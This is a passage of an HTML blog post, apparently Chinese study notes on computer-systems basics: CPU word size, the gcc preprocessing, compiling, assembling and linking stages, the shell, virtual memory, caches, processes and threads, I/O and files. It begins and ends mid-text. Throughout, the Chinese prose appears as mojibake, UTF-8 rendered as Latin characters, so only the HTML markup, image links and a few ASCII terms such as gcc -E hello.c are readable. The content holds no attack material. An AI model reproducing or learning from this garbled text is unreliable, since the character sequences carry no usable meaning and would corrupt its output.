è¾“çš„æ•°æ®ï¼Œå°±æ˜¯æŠŠ64ä¸ªæ¯”ç‰¹åˆ’åˆ†æˆäº†ä¸€ä¸ªå®šé•¿ï¼Œç„¶åä¼ è¾“ç»™CPUã€‚æ¯•ç«Ÿæ¥æ”¶çš„æ•°æ®éƒ½æ˜¯64ä½æ¯”ç‰¹ä½ä¸€ç»„äº†ï¼Œé‚£å¤„ç†èµ·æ¥ï¼Œè‡ªç„¶ä¹Ÿè¦æ˜¯64ä½æ¯”ç‰¹ä¸ºä¸€ç»„ã€‚çœ‹ä¸€ä¸‹ä¹¦ä¸­æ€ä¹ˆä»‹ç»CPUçš„</p><p><em>å¤„ç†</em>å™¨</p><blockquote><p><em>ä¸­å¤®å¤„ç†å•å…ƒï¼ˆCPUï¼‰,ç®€ç§°å¤„ç†å™¨ï¼Œæ˜¯è§£é‡Šï¼ˆæˆ–æ‰§è¡Œï¼‰å­˜å‚¨åœ¨ä¸»å­˜ä¸­æŒ‡ä»¤çš„å¼•æ“ã€‚å¤„ç†å™¨çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªå¤§å°ä¸ºä¸€ä¸ªå­—çš„å­˜å‚¨è®¾å¤‡ï¼ˆæˆ–å¯„å­˜å™¨ï¼‰ï¼Œç§°ä¸ºç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰ã€‚åœ¨ä»»ä½•æ—¶åˆ»ï¼ŒPCéƒ½æŒ‡å‘ä¸»å­˜ä¸­çš„æŸæ¡æœºå™¨è¯­è¨€æŒ‡ä»¤ï¼ˆå³å«æœ‰è¯¥æ¡æŒ‡ä»¤çš„åœ°å€ï¼‰ã€‚</em><br>   <u>ä»ç³»ç»Ÿé€šç”µå¼€å§‹ï¼Œç›´åˆ°ç³»ç»Ÿæ–­ç”µï¼Œå¤„ç†å™¨ä¸€ç›´åœ¨ä¸æ–­åœ°æ‰§è¡Œç¨‹åºè®¡æ•°å™¨æŒ‡å‘çš„æŒ‡ä»¤, å†æ›´æ–°ç¨‹åºè®¡æ•°å™¨ï¼Œä½¿å…¶æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤</u>åœ¨è¿™ä¸ªæ¨¡å‹ä¸­ï¼ŒæŒ‡ä»¤æŒ‰ç…§ä¸¥æ ¼çš„é¡ºåºæ‰§è¡Œï¼Œè€Œæ‰§è¡Œä¸€æ¡æŒ‡ä»¤åŒ…å«æ‰§è¡Œä¸€ç³»åˆ—çš„æ­¥éª¤ã€‚å¤„ç†å™¨ä»ç¨‹åºè®¡æ•°å™¨æŒ‡å‘çš„å†…å­˜å¤„è¯»å–æŒ‡ä»¤ï¼Œè§£é‡ŠæŒ‡ä»¤ä¸­çš„ä½ï¼Œæ‰§è¡Œè¯¥æŒ‡ä»¤æŒ‡ç¤ºçš„ç®€å•æ“ä½œï¼Œç„¶åæ›´æ–°PC,ä½¿å…¶æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤, è€Œè¿™æ¡æŒ‡ä»¤å¹¶ä¸ä¸€å®šå’Œåœ¨å†…å­˜ä¸­åˆšåˆšæ‰§è¡Œçš„æŒ‡ä»¤ç›¸é‚»ã€‚*</p></blockquote><p>â€‹<strong>å¯ä»¥çœ‹åˆ°CPUå’Œæ€»çº¿åœ¨è®¾è®¡çš„æ—¶å€™ï¼Œéƒ½è¢«åˆ»æ„è®¾ç½®æˆäº†ä¸€æ¬¡å¤„ç†æˆ–ä¼ è¾“ä¸€ä¸ªå­—ã€‚è€Œè¿™ä¸ªå­—çš„å¤§å°å°±å†³å®šäº†è¿™ä¸ªç¨‹åºæ˜¯ä¸ª32ä½çš„è¿˜æ˜¯64ä½çš„ã€‚</strong></p><p>ç¨‹åºç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶çš„å››ä¸ªé˜¶æ®µ</p><p>ä¸€ä¸ªç¨‹åºåˆšå†™å®Œçš„æ—¶å€™ï¼Œå®ƒå…¶å®æ˜¯è¿™æ ·çš„ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304171313301.png" alt="image-20230417131308240"></p><p>ä½†æ­¤æ—¶å®ƒå¹¶ä¸æ˜¯æˆ‘ä»¬æœ€ç»ˆè¦çš„ELFï¼ˆLinuxä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ç¨‹åºï¼Œéœ€è¦ç»è¿‡ç¼–è¯‘ä¹‹åï¼Œæ‰èƒ½å˜æˆæˆ‘ä»¬èƒ½å¤Ÿæ‰§è¡Œçš„ELFæ–‡ä»¶ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304171313433.png" alt="image-20230417131335367"></p><p>æ­¤æ—¶å•å•çœ‹å¤§å°ï¼Œä½ åº”è¯¥å°±ä¼šäº§ç”Ÿä¸€ä¸ªç–‘é—®ï¼Œåˆšå†™å®Œçš„æ—¶å€™ï¼Œå¤§å°æ˜¯70å­—èŠ‚ï¼Œç»“æœç¼–è¯‘æˆäº†å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå’‹å°±æˆäº†8.2KBï¼Œå¤§å°ç›´æ¥ç¿»äº†å°†è¿‘120å€ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ</p><p>è¿™æ—¶å€™æˆ‘ä»¬å°±è¦èŠèŠè¿™ä¸ªç¨‹åºè¢«ç¼–è¯‘æˆELFæ–‡ä»¶çš„å››ä¸ªé˜¶æ®µäº†ã€‚</p><h2 id="1ã€é¢„å¤„ç†é˜¶æ®µ"><a href="#1ã€é¢„å¤„ç†é˜¶æ®µ" class="headerlink" title="1ã€é¢„å¤„ç†é˜¶æ®µ"></a>1ã€é¢„å¤„ç†é˜¶æ®µ</h2><p>è¿™ä¸ªé˜¶æ®µæœ€ä¸»è¦çš„äº‹æƒ…ï¼Œå°±æ˜¯æŠŠ#åé¢çš„å†…å®¹å»ç”¨ä»£ç æ›¿æ¢æ‰ï¼Œå°±æ¯”å¦‚#include&lt;stdio.h&gt;è¿™å¥è¯ï¼Œåœ¨é¢„å¤„ç†é˜¶æ®µï¼Œè¿™å¥è¯ä¼šæ¶ˆå¤±ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å¾ˆé•¿çš„ä»£ç ã€‚æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªhello worldæºæ–‡ä»¶ï¼Œç„¶åç”¨gcc -E hello.cå»ç¼–è¯‘ä¸€ä¸‹ã€‚</p><p><img src="/../img/2706180-20220215105925287-2109179106.png"></p><p>å¯ä»¥å‘ç°ï¼ŒåŸæœ¬çš„#include&lt;stdio.h&gt;æ²¡äº†ï¼Œå˜æˆäº†ä¸€äº›ä»£ç ï¼ˆè¿™å¼ å›¾ç‰‡æ²¡æœ‰å±•ç¤ºå®Œå…¨ï¼Œå› ä¸ºä»£ç å¤ªå¤šäº†ï¼Œå°±æˆªå–äº†ä¸€å°éƒ¨åˆ†ï¼‰ä¸è¿‡æˆ‘ä»¬å†™çš„mainå‡½æ•°çš„ä»£ç è¿˜åœ¨ã€‚</p><h2 id="2ã€ç¼–è¯‘é˜¶æ®µ"><a href="#2ã€ç¼–è¯‘é˜¶æ®µ" class="headerlink" title="2ã€ç¼–è¯‘é˜¶æ®µ"></a>2ã€ç¼–è¯‘é˜¶æ®µ</h2><p>è¿™ä¸ªé˜¶æ®µå°±æ˜¯é€šè¿‡ç¼–è¯‘å™¨ï¼ŒæŠŠæˆ‘ä»¬å†™çš„cçš„é«˜çº§è¯­è¨€ä»£ç å˜æˆäº†æ±‡ç¼–æŒ‡ä»¤ã€‚é€šè¿‡gcc -S hello.cå‘½ä»¤å¯ä»¥ç¼–è¯‘å‡ºæ¥hello.sæ–‡ä»¶ã€‚</p><p><img src="/../img/2706180-20220215105929045-624871612.png"></p><h2 id="3ã€æ±‡ç¼–é˜¶æ®µ"><a href="#3ã€æ±‡ç¼–é˜¶æ®µ" class="headerlink" title="3ã€æ±‡ç¼–é˜¶æ®µ"></a>3ã€æ±‡ç¼–é˜¶æ®µ</h2><p>æ±‡ç¼–é˜¶æ®µå°±æ˜¯æŠŠä¸Šä¸ªé˜¶æ®µå¾—åˆ°çš„æ±‡ç¼–æŒ‡ä»¤ç»™ç¿»è¯‘æˆæœºå™¨è¯­è¨€æŒ‡ä»¤ï¼ˆå°±æ˜¯äºŒè¿›åˆ¶æŒ‡ä»¤ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶ç»è¿‡äº†æ±‡ç¼–é˜¶æ®µåï¼Œæˆ‘ä»¬å†æŸ¥çœ‹ç¼–è¯‘å¾—åˆ°çš„æ–‡ä»¶ï¼Œå¾—åˆ°çš„å°±å…¨éƒ½æ˜¯ä¹±ç äº†ã€‚ç”¨gcc -c hello.cå‘½ä»¤å»ç¼–è¯‘ã€‚æ­¤æ—¶çš„æ–‡ä»¶ä¹Ÿå°±æ˜¯ç›®æ ‡æ–‡ä»¶ï¼ˆè¢«ç¼–è¯‘å¥½äº†ï¼Œä¸è¿‡è¿˜æ²¡æœ‰è¿›è¡Œé“¾æ¥çš„æ–‡ä»¶ï¼‰</p><p><img src="/../img/2706180-20220215105932332-2146993747.png"></p><h2 id="4ã€é“¾æ¥é˜¶æ®µ"><a href="#4ã€é“¾æ¥é˜¶æ®µ" class="headerlink" title="4ã€é“¾æ¥é˜¶æ®µ"></a>4ã€é“¾æ¥é˜¶æ®µ</h2><p>å°±æ¯”å¦‚è¿™ä¸ªæœ€ç®€å•çš„hello worldçš„ç¨‹åºï¼Œä½ æœ‰æ²¡æœ‰æƒ³è¿‡ï¼Œå‡­ä»€ä¹ˆprintfå‡½æ•°å®ƒå°±å¯ä»¥å»æ‰“å°ã€‚å…¶å®å¥¥ç§˜å°±åœ¨è¿™ä¸ªé“¾æ¥é˜¶æ®µï¼Œè¿™ä¸ªprintfå‡½æ•°çš„èƒŒåä¹Ÿæ˜¯æœ‰å¾ˆå¤šçš„ä»£ç ï¼ˆç»ä¸æ˜¯ä½ è¡¨é¢ä¸Šçœ‹èµ·æ¥çš„printf()è¿™ä¸€ä¸ªå•è¯ï¼‰åªä¸è¿‡è¿™ä¸ªprintfå‡½æ•°çš„ä»£ç å·²ç»æå‰è¢«å†™å¥½äº†ï¼Œå¹¶ä¸”ä¹Ÿè¢«æ‰“åŒ…æˆäº†ä¸€ä¸ªç›®æ ‡æ–‡ä»¶ã€‚å› æ­¤åœ¨é“¾æ¥é˜¶æ®µåªéœ€è¦å°†éœ€è¦çš„ç›®æ ‡æ–‡ä»¶éƒ½åˆå¹¶åˆ°ä¸€èµ·ï¼Œå°±æˆä¸ºäº†æœ€åçš„ELFæ–‡ä»¶ã€‚</p><h2 id="ç¼–è¯‘ç³»ç»Ÿ"><a href="#ç¼–è¯‘ç³»ç»Ÿ" class="headerlink" title="ç¼–è¯‘ç³»ç»Ÿ"></a>ç¼–è¯‘ç³»ç»Ÿ</h2><p>æœ€åå¯ä»¥çœ‹ä¸€ä¸‹æ•´ä½“çš„è¿‡ç¨‹ï¼Œå¦‚ä¸‹å›¾ã€‚å¹¶ä¸”æ‰§è¡Œè¿™å››ä¸ªé˜¶æ®µçš„ç¨‹åºï¼ˆé¢„å¤„ç†å™¨ã€ç¼–è¯‘å™¨ã€æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨ï¼‰ä¸€èµ·æ„æˆäº†ç¼–è¯‘ç³»ç»Ÿ</p><p><img src="/../img/2706180-20220215110251028-1658054176.png"></p><h1 id="ä»€ä¹ˆæ˜¯shell"><a href="#ä»€ä¹ˆæ˜¯shell" class="headerlink" title="ä»€ä¹ˆæ˜¯shell"></a>ä»€ä¹ˆæ˜¯shell</h1><p>shellæœ¬è´¨ä¸Šå°±æ˜¯ä¸ªç¨‹åºï¼Œä¸è¿‡æˆ‘é€šå¸¸æŠŠå®ƒç†è§£ä¸ºç»ˆç«¯ã€‚äº‹å®ä¸Šshellåªæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œè§£é‡Šå™¨ï¼ˆè¿™ä¸ªè§£é‡Šçš„æ›´å¥½ä¸€äº›ï¼‰ï¼ˆä¹Ÿå°±æ„å‘³ç€å…¶å®å®ƒå¹¶ä¸åŒ…æ‹¬å¯è§†åŒ–ç•Œé¢ï¼Œä¸è¿‡ä½ æŠŠå®ƒç†è§£æˆç»ˆç«¯ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜çš„ï¼‰ï¼ˆå…·ä½“ä»‹ç»çš„è¯ï¼Œä¹¦ä¸­å·²ç»è¯¦ç»†å†™äº†ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ï¼‰<br><img src="/../img/2706180-20220215105936187-1610462697.png"></p><h1 id="è™šæ‹Ÿå†…å­˜-amp-amp-é«˜é€Ÿç¼“å­˜-amp-amp-ä¸»å­˜"><a href="#è™šæ‹Ÿå†…å­˜-amp-amp-é«˜é€Ÿç¼“å­˜-amp-amp-ä¸»å­˜" class="headerlink" title="è™šæ‹Ÿå†…å­˜&amp;&amp;é«˜é€Ÿç¼“å­˜&amp;&amp;ä¸»å­˜"></a>è™šæ‹Ÿå†…å­˜&amp;&amp;é«˜é€Ÿç¼“å­˜&amp;&amp;ä¸»å­˜</h1><p>è¿™é‡Œæˆ‘åªæ˜¯å…ˆç®€å•ä»‹ç»ä¸€ä¸‹è¿™ä¸‰è€…ï¼Œåœ¨ä»¥åçš„ç¬”è®°ä¸­ï¼Œä¼šè¯¦ç»†è®¨è®ºä»–ä»¬ä¸‰ä¸ªã€‚</p><h2 id="1ã€å…ˆè°ˆè°ˆä¸»å­˜"><a href="#1ã€å…ˆè°ˆè°ˆä¸»å­˜" class="headerlink" title="1ã€å…ˆè°ˆè°ˆä¸»å­˜"></a>1ã€å…ˆè°ˆè°ˆä¸»å­˜</h2><pre><code>    é¦–å…ˆä¸»å­˜å°±æ˜¯å†…å­˜ï¼Œè¿™ä¿©æ˜¯ä¸€å›äº‹ã€‚å½“ä¸€ä¸ªç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œè¿™ä¸ªç¨‹åºå°±ä¼šè¢«åŠ è½½åˆ°å†…å­˜é‡Œé¢ï¼Œä»¥ä¾¿CPUè¿›è¡Œæ•°æ®å¤„ç†ï¼Œç®€å•æ¥è¯´å†…å­˜å°±æ˜¯ç”¨äºæš‚æ—¶å­˜æ”¾CPUä¸­çš„è¿ç®—æ•°æ®ã€‚åœ¨ä¹¦ä¸­å¼ºè°ƒè¯´ï¼Œä¸»å­˜æ˜¯ä¸€ä¸ªä¸´æ—¶å­˜å‚¨è®¾å¤‡ï¼Œä¸ºä»€ä¹ˆè¿™æ˜¯ä¸ªä¸´æ—¶çš„å‘¢ï¼Ÿå› ä¸ºå®ƒé€šç”µæ‰ä¼šè¿›è¡Œå­˜å‚¨ï¼Œæ–­ç”µåå†…å­˜ä¸­çš„æ•°æ®å°±ä¼šæ¶ˆå¤±ã€‚    å¦‚æœå•å¬è§£é‡Šå¤ªæŠ½è±¡çš„è¯ï¼Œè¿™é‡Œæ¥ä¸¾ä¸¤ä¸ªä¾‹å­ã€‚å¦‚æœä½ åœ¨ç”¨wordå†™ä¸€ä¸ªæ–‡æ¡£ï¼Œä½ åœ¨æ•²å‡»æ¯ä¸€ä¸ªå­—åˆ°wordä¸­çš„æ—¶å€™ï¼Œæ­¤æ—¶å®ƒä»¬æ˜¯å­˜å‚¨åˆ°äº†å†…å­˜ä¸­ï¼Œå¦‚æœä½ ç‚¹å‡»äº†ä¿å­˜ï¼Œé‚£ä¹ˆå®ƒä»¬æ‰å­˜åˆ°äº†ç£ç›˜ä¸­ã€‚å¦‚æœä½ å¼€äº†ä¸€å±€æ¸¸æˆï¼Œæ­¤æ—¶è¿™ä¸ªæ¸¸æˆå…¶å®å°±æ˜¯åœ¨å†…å­˜ä¸­è¿›è¡Œã€‚</code></pre><p><em>ä»é€»è¾‘ä¸Šæ¥è¯´ï¼Œå­˜å‚¨å™¨æ˜¯ä¸€ä¸ªçº¿æ€§çš„å­—èŠ‚æ•°ç»„ï¼Œæ¯ä¸ªå­—èŠ‚éƒ½æœ‰å…¶å”¯ä¸€çš„åœ°å€ï¼ˆæ•°ç»„ç´¢å¼•ï¼‰ï¼Œè¿™äº›åœ°å€æ˜¯ä»é›¶å¼€å§‹çš„ã€‚</em></p><p>ä»ä¹¦ä¸­çš„è¿™å¥è¯ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å…¶å®è¿™ä¸ªå­˜å‚¨å™¨ï¼Œå°±å¯ä»¥æŠŠå®ƒç†è§£ä¸ºä¸€ä¸ªæ—…é¦†ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªä¸€ä¸ªçš„å°æˆ¿é—´ï¼Œæ¯ä¸ªæˆ¿é—´éƒ½æ˜¯æœ‰ä¸€ä¸ªå”¯ä¸€çš„å·ç ã€‚</p><p>æ­¤æ—¶é—®é¢˜å°±æ¥äº†ï¼Œæˆ‘ä»¬å¦‚æœå¼€äº†ä¸¤ä¸ªæ¸¸æˆå‘¢ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªæ¸¸æˆï¼Œæ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹å¯¹åº”ç€è‡ªå·±çš„å†…å­˜ï¼Œå¯æ˜¯å¦‚æœä¸¤ä¸ªè¿›ç¨‹å‘¢ï¼Œæˆ–è€…æ›´å¤šä¸ªè¿›ç¨‹å‘¢ï¼Ÿæˆ‘ä»¬æœ‰é‚£ä¹ˆå¤šå†…å­˜å»åˆ†é…ç»™ä»–ä»¬ä¹ˆï¼Ÿæ­¤æ—¶æˆ‘ä»¬å¼•å…¥äº†è™šæ‹Ÿå†…å­˜è¿™ä¸ªæ¦‚å¿µã€‚</p><h2 id="2ã€è™šæ‹Ÿå†…å­˜"><a href="#2ã€è™šæ‹Ÿå†…å­˜" class="headerlink" title="2ã€è™šæ‹Ÿå†…å­˜"></a>2ã€è™šæ‹Ÿå†…å­˜</h2><p>è™šæ‹Ÿå†…å­˜ç»†äº†è®²æ˜¯æœ‰å¾ˆå¤šä¸œè¥¿çš„ï¼Œè¿™é‡Œç®€å•è§£é‡Šä¸€ä¸‹ã€‚è™šæ‹Ÿå†…å­˜å‡ºç°çš„å…¶ä¸­ä¸€ä¸ªç›®çš„å°±æ˜¯å»è§£å†³æˆ‘ä¸Šé¢è¯´çš„é‚£ä¸ªé—®é¢˜ï¼ˆå»â€œåˆ›é€ â€å‡ºæ¥æ›´å¤šçš„å†…å­˜æ¥ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼‰è¿™é‡Œçš„åˆ›é€ ï¼Œæˆ‘åŠ äº†å¼•å·ï¼Œäº‹å®ä¸Šå®ƒå¹¶ä¸æ˜¯åˆ›é€ ï¼Œè€Œæ›´åƒæ˜¯ä¸€ç§æ¬ºéª—ï¼Œ<strong>ä¸€ä¸ªå«åšMMUçš„ä¸œè¥¿ï¼Œå»æ¬ºéª—äº†æ¯ä¸ªè¿›ç¨‹ï¼Œå½“æ¯ä¸ªè¿›ç¨‹å‡†å¤‡æä¾›ç»™CPUæ•°æ®çš„æ—¶å€™ï¼ŒMMUæ‰ä¼šæŠŠé‚£äº›æ•°æ®æ”¾åˆ°å†…å­˜é‡Œé¢ï¼Œä¸ç„¶çš„è¯ï¼Œé‚£äº›ä¸ç”¨çš„æ•°æ®æ—¶ä¸€ç›´å­˜æ”¾åœ¨ç£ç›˜ä¸­ï¼ˆè¿™æ ·çœŸæ­£çš„å†…å­˜å­˜å‚¨çš„éƒ½æ˜¯ä¸CPUå³å°†äº¤æ¢çš„æ•°æ®ï¼Œè¿™æ ·å°±ç±»ä¼¼äºâ€œåˆ›é€ â€äº†æ›´å¤šçš„å†…å­˜ï¼‰</strong>ã€‚ä¸è¿‡è¿›ç¨‹æœ¬èº«æ˜¯ä¸çŸ¥é“è¿™ä»¶äº‹æƒ…çš„ï¼Œè¿›ç¨‹ä¸€ç›´ä»¥ä¸ºè‡ªå·±æ˜¯ç‹¬å äº†æ•´ä¸ªå†…å­˜çš„ä½¿ç”¨ã€‚</p><h2 id="3ã€é«˜é€Ÿç¼“å­˜"><a href="#3ã€é«˜é€Ÿç¼“å­˜" class="headerlink" title="3ã€é«˜é€Ÿç¼“å­˜"></a>3ã€é«˜é€Ÿç¼“å­˜</h2><p><strong>è¿™ä¸ªé«˜é€Ÿç¼“å­˜å…¶å®å°±æ˜¯æ¯”å†…å­˜ä¼ è¾“æ•°æ®æ›´å¿«çš„ä¸œè¥¿ã€‚</strong>ä¼ è¾“æ•°æ®æœ€å¿«çš„æ˜¯å¯„å­˜å™¨ï¼Œå› ä¸ºå¯„å­˜å™¨æœ¬èº«å°±åœ¨CPUä¸Šï¼Œç„¶åå°±æ˜¯é«˜é€Ÿç¼“å­˜ï¼Œæ¥ç€æ˜¯å†…å­˜ï¼Œæœ€åæ˜¯å¤–å­˜ã€‚è¶Šå¾€åä¼ è¾“é€Ÿåº¦è¶Šæ…¢ï¼Œä½†æ˜¯å­˜å‚¨çš„å†…å®¹æ›´å¤šã€‚</p><p><img src="/../img/2706180-20220215105940453-1971369963.png"></p><p>ç¼“å­˜ä¹Ÿæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œä¸»è¦æ˜¯åŸæ–‡å·²ç»å†™çš„å¾ˆæ˜ç™½äº†ã€‚æœ€åå°±æ˜¯é«˜é€Ÿç¼“å­˜çš„ç›®çš„å°±æ˜¯å»æå‡è®¡ç®—æœºç³»ç»Ÿçš„å¤„ç†é€Ÿåº¦ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯è¿›ç¨‹å’Œçº¿ç¨‹ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯è¿›ç¨‹å’Œçº¿ç¨‹ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯è¿›ç¨‹å’Œçº¿ç¨‹ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯è¿›ç¨‹å’Œçº¿ç¨‹ï¼Ÿ</h1><h2 id="1ã€è¿›ç¨‹"><a href="#1ã€è¿›ç¨‹" class="headerlink" title="1ã€è¿›ç¨‹"></a>1ã€è¿›ç¨‹</h2><p>å†™å¥½çš„ç¨‹åºï¼Œå®ƒæ˜¯æ”¾åœ¨ç£ç›˜ä¸Šçš„ï¼Œå¦‚æœæˆ‘ä»¬å»è¿è¡Œå®ƒï¼Œokï¼Œå®ƒå°±å˜æˆäº†è¿›ç¨‹ã€‚<strong>å¯ä»¥è¯´è¢«è¿è¡Œçš„ç¨‹åºå°±æ˜¯è¿›ç¨‹</strong>ã€‚æ—¢ç„¶æ˜¯è¢«è¿è¡Œäº†ï¼Œé‚£è¿›ç¨‹è‚¯å®šæ˜¯åœ¨å†…å­˜ä¸­çš„ã€‚ä¸‹é¢æ˜¯è¿›ç¨‹åœ¨å†…å­˜ä¸­çš„å¸ƒå±€ã€‚</p><p><img src="/../img/2706180-20220215105944333-1401735974.png"></p><p>ç°åœ¨æˆ‘ä»¬åªè¦åˆæ­¥äº†è§£ä¸€ä¸‹è¿›ç¨‹å³å¯ã€‚<u>å¹¶ä¸”è¿›ç¨‹å½¼æ­¤ç‹¬ç«‹äº’ä¸å¹²æ‰°çš„ï¼›å¦å¤–æ¯ä¸ªè¿›ç¨‹éƒ½è®¤ä¸ºè‡ªå·±æ˜¯åœ¨ç‹¬å ç€CPUï¼Œä½†äº‹å®ä¸Šæˆ‘ä»¬ç³»ç»Ÿä¸­ä¸€å®šä¸æ˜¯å°±ä¸€ä¸ªè¿›ç¨‹ï¼Œå› æ­¤åœ¨å®é™…çš„è¿›ç¨‹åˆ‡æ¢ä¸­ï¼Œå°±ä¼šè¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆè¿™ä¸ªä¸Šä¸‹æ–‡å°±æ˜¯ä¸€ç§çŠ¶æ€ï¼Œä¾‹å¦‚PCå’Œå¯„å­˜å™¨æ–‡ä»¶çš„å½“å‰å€¼ç­‰ç­‰ï¼‰ï¼Œä¿å­˜å½“å‰ä¸Šä¸‹æ–‡ï¼Œæ¢å¤æ–°è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ã€‚</u></p><h2 id="2ã€çº¿ç¨‹"><a href="#2ã€çº¿ç¨‹" class="headerlink" title="2ã€çº¿ç¨‹"></a>2ã€çº¿ç¨‹</h2><p> <em><strong>çº¿ç¨‹æ˜¯æ“ä½œç³»ç»Ÿèƒ½å¤Ÿè¿›è¡Œè¿ç®—è°ƒåº¦çš„æœ€å°å•ä½ã€‚å®ƒè¢«åŒ…å«åœ¨è¿›ç¨‹ä¹‹ä¸­</strong>ï¼Œæ˜¯è¿›ç¨‹ä¸­çš„å®é™…è¿ä½œå•ä½ã€‚ä¸€æ¡çº¿ç¨‹æŒ‡çš„æ˜¯è¿›ç¨‹ä¸­ä¸€ä¸ªå•ä¸€é¡ºåºçš„æ§åˆ¶æµï¼Œä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥å¹¶å‘å¤šä¸ªçº¿ç¨‹ï¼Œæ¯æ¡çº¿ç¨‹å¹¶è¡Œæ‰§è¡Œä¸åŒçš„ä»»åŠ¡ã€‚</em></p><p>è¿›ç¨‹ä¹‹é—´æ˜¯å½¼æ­¤ç‹¬ç«‹çš„ï¼Œ<u>è€Œçº¿ç¨‹åªè¦æ˜¯æ‰€å±äºä¸€ä¸ªè¿›ç¨‹ä¹‹ä¸‹ï¼Œé‚£ä»–ä»¬ä¹‹é—´å°±å¯ä»¥å…±äº«ä¸€ä¸ªè¿›ç¨‹çš„èµ„æºä»¥åŠåœ°å€ç©ºé—´ã€‚å¹¶ä¸”å¤šä¸ªçº¿ç¨‹å¯ä»¥è¯»å†™åŒä¸€å¿«å†…å­˜</u>ã€‚<strong>ç”±äºè¿›ç¨‹å½¼æ­¤æ˜¯ç‹¬ç«‹çš„ï¼Œåœ¨å®‰å…¨æ€§ä¸Šç•¥èƒœä¸€ç­¹ï¼Œè€Œå¤šä¸ªçº¿ç¨‹æ˜¯å¯ä»¥è¯»å†™åŒä¸€ä¸ªå†…å­˜ï¼Œå› æ­¤åœ¨é€Ÿåº¦ä¸Šæœ‰ä¼˜åŠ¿ã€‚</strong></p><h1 id="ä»€ä¹ˆæ˜¯I-x2F-O"><a href="#ä»€ä¹ˆæ˜¯I-x2F-O" class="headerlink" title="ä»€ä¹ˆæ˜¯I&#x2F;O"></a>ä»€ä¹ˆæ˜¯I&#x2F;O</h1><p>æˆ‘æœ€æ—©çš„æ—¶å€™ï¼Œç»å¸¸çœ‹åˆ°ç½‘ä¸Šçš„æ–‡ç« è¯´I&#x2F;Oï¼Œä½†æ˜¯ä¸€ç›´ä¸ç†è§£ï¼Œå…¶å®å®ƒæ²¡ä»€ä¹ˆå¥½ç¥ç§˜çš„ï¼Œ**I&#x2F;Oçš„æ„æ€å°±æ˜¯è¾“å…¥ï¼ˆInput)å’Œè¾“å‡º(Output)**ï¼Œåªè¦å…·æœ‰è¾“å…¥è¾“å‡ºç±»å‹çš„äº¤äº’ç³»ç»Ÿéƒ½å¯ä»¥è®¤ä¸ºæ˜¯I&#x2F;Oç³»ç»Ÿã€‚<u>å°±æ¯”å¦‚æˆ‘ä»¬çš„é”®ç›˜å’Œé¼ æ ‡å°±æ˜¯è¾“å…¥è®¾å¤‡ï¼Œè€Œæ˜¾ç¤ºå™¨åˆ™æ˜¯è¾“å‡ºè®¾å¤‡ï¼Œç”šè‡³ç£ç›˜ä¹Ÿæ˜¯è¾“å‡ºè®¾å¤‡ï¼ˆå°½ç®¡è¿™ä¸ªæˆ‘ä»¬çœ‹ä¸è§ï¼Œä½†æ˜¯æ•°æ®ç¡®å®æ˜¯è¢«è¾“å‡ºåˆ°äº†ç£ç›˜ä¸­ï¼‰</u>ï¼Œæ¯ä¸ªI&#x2F;Oè®¾å¤‡éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªæ§åˆ¶å™¨æˆ–é€‚é…å™¨ä¸I&#x2F;Oæ€»çº¿ç›¸è¿ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯æ–‡ä»¶"><a href="#ä»€ä¹ˆæ˜¯æ–‡ä»¶" class="headerlink" title="ä»€ä¹ˆæ˜¯æ–‡ä»¶"></a>ä»€ä¹ˆæ˜¯æ–‡ä»¶</h1><p><strong>æ–‡ä»¶å°±æ˜¯å­—èŠ‚åºåˆ—ï¼ˆå­—èŠ‚åºåˆ—å¯èƒ½æœ‰ç‚¹æŠ½è±¡ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¾ˆå¤šä¸ªå­—èŠ‚é›†åˆæ”¾åˆ°äº†ä¸€èµ·ï¼‰</strong>ï¼Œå¹¶ä¸”åœ¨linuxä¸­ï¼Œä¸‡ç‰©çš†ä¸ºæ–‡ä»¶ï¼ˆåŒ…æ‹¬ç£ç›˜ã€é”®ç›˜ã€æ˜¾ç¤ºå™¨ç­‰ç­‰ï¼‰ã€‚</p><h1 id="å¹³å¸¸è¯´çš„CPUåˆ°åº•æ˜¯ä¸ªå•¥"><a href="#å¹³å¸¸è¯´çš„CPUåˆ°åº•æ˜¯ä¸ªå•¥" class="headerlink" 